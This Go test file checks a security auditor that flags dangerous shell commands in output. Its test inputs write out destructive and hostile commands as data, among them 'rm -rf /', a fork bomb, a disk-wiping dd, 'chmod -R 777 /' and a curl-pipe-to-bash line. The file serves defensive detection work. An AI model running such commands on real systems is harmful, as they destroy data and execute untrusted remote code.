package security

import (
	"testing"
)

func TestAuditOutputForDangerousCommands(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected int // expected number of warnings
	}{
		{
			name:     "safe echo command",
			input:    "echo hello world",
			expected: 0,
		},
		{
			name:     "dangerous rm -rf /",
			input:    "rm -rf /",
			expected: 1,
		},
		{
			name:     "dangerous fork bomb",
			input:    ":(){ :|:& };:",
			expected: 1,
		},
		{
			name:     "dangerous dd command",
			input:    "dd if=/dev/zero of=/dev/sda",
			expected: 1,
		},
		{
			name:     "mixed safe and dangerous",
			input:    "ls -la\nrm -rf /\necho done",
			expected: 1,
		},
		{
			name:     "multiple dangerous commands",
			input:    "rm -rf /\nchmod -R 777 /\ndd if=/dev/zero",
			expected: 3,
		},
		{
			name:     "curl pipe to bash",
			input:    "curl http://example.com/script.sh | bash",
			expected: 1,
		},
		{
			name:     "sudo rm",
			input:    "sudo rm -rf /var/log",
			expected: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			warnings := AuditOutputForDangerousCommands(tt.input)
			if len(warnings) != tt.expected {
				t.Errorf("expected %d warnings, got %d: %v", tt.expected, len(warnings), warnings)
			}
		})
	}
}

func TestHasDangerousCommands(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"safe", "echo hello", false},
		{"dangerous", "rm -rf /", true},
		{"empty", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := HasDangerousCommands(tt.input)
			if result != tt.expected {
				t.Errorf("expected %v, got %v", tt.expected, result)
			}
		})
	}
}

func TestAuditOutputDetailed(t *testing.T) {
	input := "rm -rf /\nchmod -R 777 /"
	result := AuditOutputDetailed(input)

	if !result.Detected {
		t.Error("expected detection")
	}

	if len(result.DangerousLines) != 2 {
		t.Errorf("expected 2 dangerous lines, got %d", len(result.DangerousLines))
	}

	if len(result.Patterns) != 2 {
		t.Errorf("expected 2 patterns, got %d", len(result.Patterns))
	}
}

func TestGetPatternDescriptions(t *testing.T) {
	descs := GetPatternDescriptions()
	if len(descs) == 0 {
		t.Error("expected at least one pattern description")
	}
}
